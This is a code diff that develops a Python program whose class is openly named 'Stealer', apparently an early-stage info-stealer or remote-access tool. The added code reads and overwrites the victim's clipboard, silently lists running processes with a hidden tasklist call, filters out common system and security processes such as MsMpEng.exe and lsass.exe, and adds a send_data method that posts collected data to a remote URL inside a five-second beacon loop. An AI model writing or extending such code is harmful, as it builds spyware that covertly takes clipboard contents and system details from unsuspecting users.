@@ -1,14 +1,23 @@
+
+#//                                                                                        
+#!                                      import
+#//                                                                                        
 import asyncio
 import aiohttp
 
 import json
-import sys, os
+import sys
+import os
 import socket
 import psutil
 import pyperclip as clipboard
+import subprocess
 
 from typing import Any
 
+#//                                                                                        
+#!                                      Codes
+#//                                                                                        
 class Codes:
 
     online = "Online"
@@ -18,6 +27,100 @@ class Commands:
 
     online_status = "Online Status"
 
+blacklist = [
+
+    "AggregatorHost.exe",
+    "ApplicationFrameHost.exe",
+    "CefSharp.BrowserSubprocess.exe",
+    "CompPkgSrv.exe",
+    "Corsair.Service.CpuIdRemote64.exe",
+    "Corsair.Service.exe",
+    "CorsairCpuIdService.exe",
+    "CorsairDeviceControlService.exe",
+    "GameManagerService.exe",
+    "HPPrintScanDoctorService.exe",
+    "MpDefenderCoreService.exe",
+    "MsMpEng.exe",
+    "NVDisplay.Container.exe",
+    "NisSrv.exe",
+    "OfficeClickToRun.exe",
+    "OpenConsole.exe",
+    "PhoneExperienceHost.exe",
+    "RazerCentralService.exe",
+    "Registry",
+    "RuntimeBroker.exe",
+    "RzAppManager",
+    "RzBTLEManager",
+    "RzChromaConnectManager",
+    "RzChromaConnectServer",
+    "RzChromaStreamServer.exe",
+    "RzDeviceManager",
+    "RzDiagnostic",
+    "RzIoTDeviceManager",
+    "RzSDKServer.exe",
+    "RzSDKService.exe",
+    "RzSmartlightingDeviceManager",
+    "RzTHX0555.exe",
+    "SearchApp.exe",
+    "SearchIndexer.exe",
+    "SecurityHealthService.exe",
+    "ShellExperienceHost.exe",
+    "StartMenuExperienceHost.exe",
+    "System",
+    "System Idle Process",
+    "TextInputHost.exe",
+    "UserOOBEBroker.exe",
+    "VSHelper.exe",
+    "VSSrv.exe",
+    "Video.UI.exe",
+    "WmiApSrv.exe",
+    "WmiPrvSE.exe",
+    "YourPhoneAppProxy.exe",
+    "audiodg.exe",
+    "backgroundTaskHost.exe",
+    "conhost.exe",
+    "crashpad_handler.exe",
+    "csrss.exe",
+    "ctfmon.exe",
+    "dasHost.exe",
+    "dllhost.exe",
+    "dwm.exe",
+    "fontdrvhost.exe",
+    "gamingservices.exe",
+    "gamingservicesnet.exe",
+    "iCUEDevicePluginHost.exe",
+    "iCUEUpdateService.exe",
+    "lsass.exe",
+    "msedge.exe",
+    "nvcontainer.exe",
+    "pet.exe",
+    "pwahelper.exe",
+    "services.exe",
+    "sihost.exe",
+    "smss.exe",
+    "spoolsv.exe",
+    "steamservice.exe",
+    "steamwebhelper.exe",
+    "svchost.exe",
+    "taskhostw.exe",
+    "tasklist.exe",
+    "vgtray.exe",
+    "vmcompute.exe",
+    "warp-svc.exe",
+    "wininit.exe",
+    "winlogon.exe",
+    "winrtutil32.exe",
+    "sppsvc.exe",
+    "MoUsoCoreWorker.exe",
+    "Razer Synapse Service Process.exe",
+    "Razer Synapse Service.exe",
+    "Razer Central.exe",
+    "spacedeskServiceTray.exe"
+]
+
+#//                                                                                        
+#!                              Stealer Functions
+#//                                                                                        
 class Stealer:
 
     async def get_public_ip():
@@ -46,7 +149,7 @@ class Stealer:
     
     async def get_clipboard():
 
-        data = clipboard.copy()
+        data = clipboard.paste()
 
         if type(data) == str:
 
@@ -55,11 +158,69 @@ class Stealer:
         else:
 
             return "Error"
-    
-    #todo INSERT CLIPBOARD
-    #todo GET RUNNING APPS
-    
+        
+    async def paste_clipboard(text: str):
 
+        clipboard.copy(text)
+
+    async def get_running_apps() -> list:
+    
+        try:
+            # Führt 'tasklist' aus und erfasst die Ausgabe
+            output = subprocess.check_output(
+
+                ["tasklist", "/fo", "csv", "/nh"],
+                text=True,
+                encoding="cp850",  # Wichtig für Umlaute/Kompatibilität
+                creationflags=subprocess.CREATE_NO_WINDOW  # Unterdrückt Konsolenfenster
+            )
+
+            # Extrahiert die Prozessnamen aus der CSV-Ausgabe
+            programs = []
+
+            for line in output.splitlines():
+
+                if line.strip():  # Ignoriert leere Zeilen
+
+                    process_name = line.split('","')[0].strip('"')
+                    programs.append(process_name)
+
+            return sorted(list(set(programs)))  # Duplikate entfernen & sortieren
+
+        except subprocess.CalledProcessError as e:
+
+            print(f"Fehler beim Ausführen von 'tasklist': {e}")
+
+            return []
+        
+        except Exception as e:
+
+            print(f"Unerwarteter Fehler: {e}")
+
+            return []
+        
+    @staticmethod
+    async def filter_running_apps(running_apps: list) -> list:
+
+        global blacklist
+
+        filtered_apps = []
+
+        for app in running_apps:
+
+            if app in blacklist:
+
+                continue
+
+            else:
+
+                filtered_apps.append(app)
+
+        return filtered_apps
+
+#//                                                                                        
+#!                                      Mainclass
+#//                                                                                        
 class ALA:
 
     def __init__(self):
@@ -118,7 +279,7 @@ class ALA:
 
                 print(f"GET-Response: {await response.text()}")
 
-    async def send_online_status(self) -> None:
+    async def send_online_status(self) -> None: #! send online status
 
         async with aiohttp.ClientSession() as session:
 
@@ -129,6 +290,18 @@ class ALA:
                 headers = self.header) as response:
 
                 return None
+            
+    async def send_data(self, command: str, data: Any) -> None: #! send data
+
+        async with aiohttp.ClientSession() as session:
+
+            async with session.post(
+                
+                self.url, 
+                json = self.process_json(command = command, data = data),
+                headers = self.header) as response:
+
+                return None
 
     async def ala(self): #! Mainloop
 
@@ -136,16 +309,20 @@ class ALA:
 
             try:
 
-                #await self.post_request()
-
                 await self.send_online_status()
                 
-
             except Exception as network_error:
                 
                 print(network_error)
 
             
+            unfiltered_running_apps = await Stealer.get_running_apps()
+
+            filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps)
+            
+            for app in filtered_running_apps:
+
+                print(app)
 
             await asyncio.sleep(5)
 
@@ -153,6 +330,9 @@ class ALA:
 
         asyncio.run(self.ala())
 
+#//                                                                                        
+#!                                      Start
+#//                                                                                        
 if __name__ == "__main__":
 
     ala = ALA()
